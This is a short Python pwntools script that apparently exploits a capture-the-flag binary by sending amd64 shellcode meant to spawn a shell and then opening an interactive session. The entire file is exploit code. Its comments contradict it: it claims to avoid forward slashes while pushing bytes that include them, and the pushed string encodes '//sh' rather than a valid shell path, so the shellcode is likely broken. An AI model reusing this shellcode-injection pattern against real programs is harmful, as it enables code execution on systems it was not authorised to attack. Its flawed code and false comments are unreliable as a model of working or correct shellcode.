from pwn import *

# Set up the binary and context
context.binary = "./challenge"
context.arch = "amd64"

# Connect to the process
p = process("./challenge")

# Compact shellcode that avoids null bytes, newlines and forward slashes
shellcode = asm(
    """
    /* Push 'sh' onto stack */
    push 0x68732f2f  /* 'hs//' */
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    push 59
    pop rax
    syscall
"""
)

print(f"Shellcode length: {len(shellcode)} bytes")
if len(shellcode) >= 0x1F:
    print("Warning: Shellcode too long!")

# Send the payload
p.send(shellcode)

# Get interactive shell
p.interactive()
